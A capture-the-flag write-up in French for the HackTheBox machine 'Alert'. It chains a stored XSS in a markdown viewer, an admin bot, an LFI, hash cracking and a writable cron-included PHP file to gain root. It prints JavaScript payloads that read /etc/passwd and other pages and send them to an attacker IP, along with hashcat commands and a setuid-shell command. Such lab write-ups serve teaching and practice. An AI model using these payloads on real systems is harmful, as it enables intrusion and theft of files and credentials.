---
title: Alert
description: weeu weeeu weeu
tags:
  - HTB
  - machine
date: 2026-04-15T09:32
tasks:
  - format
parent file:
  - "[[HTB MOC]]"
os: linux
difficulty: easy
category:
  - writeups
  - htb
season: "6"
seasonal: no
---

# Outline
## Foothold
- Sont disponibles deux sites: un site qui nous demande de nous connecter (sous-domaine) et un qui nous propose de visualiser des fichiers markdown (site principal) puis de les partager.
- En créant un fichier pour une XSS qui exfiltre les données il est possible de le partager via la page 'contact us', ce qui permet de faire exécuter le code javascript souhaité à un bot admin.
- En exécutant du code javascript il est alors possible de récupérer le contenu de `messages.php` puis grâce au contenu de la page et une LFI, de lire n'importe quel fichier.
- Un fichier de configuration vend la mèche sur l'endroit de stockage d'identifiants qui, une fois craqués, donnent accès à un utilisateur.
## PrivEsc to root
- Sur le port `8080` tourne un site web qui a vérifie la disponibilité des deux autres sites. En regardant le code source on voit appelé un fichier que l'on peut modifier, qui nous permet d'exécuter les commandes souhaitées.


# Foothold

En plus des ports `22` et `80`, le port `12227` est marqué comme ouvert.

Le site principal permet de visualiser des fichiers markdown.
![[Pasted image 20260415094227.png]]

Le sous-domain `statistics` présente une page de connexion, d'où le fait qu'elle soit présentée différemment par ffuf.
![[Pasted image 20260415094611.png]]

De retour sur la page principal, le lecteur de markdown ressemble à ça:
![[Pasted image 20260415105756.png]]

Il se trouve qu'il est possible d'inclure du html dans un document markdown. Par exemple
```
<script src="http://10.10.15.23:3333/script.js"></script>
```

En envoyant ça comme contenu d'un fichier `xss.md`, une requête nous est bien envoyée, ce qui confirme qu'une xss est possible. Il faut modifier le payload de la sorte pour voler le cookie:
```
fetch("http://10.10.15.23:3333/"+document.cookie)
  .then(r => r.text())
  .then(data => {
    // Send it to your server
    fetch("http://yourip:yourport/?d=" + btoa(data), { mode: "no-cors" });
  });
```

Sur le site il existe une autre page intéressante appelée "contact us" qui permet d'envoyer un message à un administrateur. On lui envoie alors le lien que l'on a obtenu avec notre xss.

Si on regarde sur notre listener on voit bien une requête mais rien du tout dans les cookies.
![[Pasted image 20260415134327.png]]

L'idée est alors de modifier le script pour aller chercher une donnée qui nous intéresse, le contenu de la pages messages.php.
```
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/messages.php',true);
req.send();
function handleResponse() {
    var body = this.responseText;
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', 'http://10.10.15.23:3334/', true);
    changeReq.send('body='+body)
};
```
Dans la réponse est indiqué un fichier que l'on peut aussi demander:
```
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/messages.php?file=2024-03-10_15-48-34.txt',true);
req.send();
function handleResponse() {
    var body = this.responseText;
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', 'http://10.10.15.23:3334/', true);
    changeReq.send('body='+body)
};
```
Cette requête permet en fait de demander n'importe quel fichier grâce à une LFI. Il faut simplement changer le script pour
```
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/messages.php?file=../../../../../../etc/passwd',true);
req.send();
function handleResponse() {
    var body = this.responseText;
    var changeReq = new XMLHttpRequest();
    changeReq.open('get', 'http://10.10.15.23:3334/?content='+btoa(body), true);
};
```
Ainsi qu'ouvrir le port 3333 et le port 3334 puis envoyer le lien de la xss par message et lire la réponse.
```
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/messages.php?file=../../../../../../etc/passwd',true);
req.send();
function handleResponse() {
    var body = this.responseText;
    var changeReq = new XMLHttpRequest();
    changeReq.open('get', 'http://10.10.15.23:3334/?content='+btoa(body), true);
    changeReq.send();
};
```
Il est possible par exemple de lire ainsi le fichier `/etc/passwd`.
![[Pasted image 20260415144756.png]]
Ce qui permet par exemple de voir qu'il existe deux utilisateurs: `albert` et `david`.

Ensuite c'est une question de fichiers. Le fichier `/etc/apache2/sites-enabled/000-default.conf` donne le root folder du site: `/var/www/alert.htb` et pour `statistics`: `/var/www/statistics.alert.htb`. Et surtout, dans ce fichier une indication est donnée sur une partie restreinte: `/var/www/statistics.alert.htb/.htpasswd` dont le contenu est
```
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

Ensuite les commandes pour craquer le mot de passe permettent de voir le mode du hash:
```
echo 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
cut -d: -f2 hash.txt | hashid -m
hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt --username
```

Le hash est identifié comme un apache md5 (mode 1600) et l'identifiant est `albert:manchesterunited`.

Et voilà, le premier accès ssh obtenu.
![[Pasted image 20260415153324.png]]

# PrivEsc to root

En arrivant sur le profil de `albert` il est possible de remarquer qu'un processus tourne sur le port 8080. Il faut le forward via ssh pour pouvoir y accéder:
```
ssh -L 9001:localhost:8080 -N -vv albert@alert.htb
```

En regardant les fichiers de configuration il est possible de trouver le dossier `/opt/website-monitor`, dossier dans lequel tous les fichiers de website-monitor sont. Dans le fichier `monitor.php` (qui on peut le deviner/le vérifier avec les logs, tourne avec un cron) il est possible de lire
```
include('config/configuration.php');
```

Or, il se trouve que ce fichier est modifiable par un groupe dont albert fait partie. On en change donc le contenu pour le suivant:
```
system("cp /bin/bash /tmp/rootshell; chmod 7777 /tmp/rootshell");
```

Et voilà notre accès root.
![[Pasted image 20260415174236.png]]

![[Pasted image 20260415174258.png]]
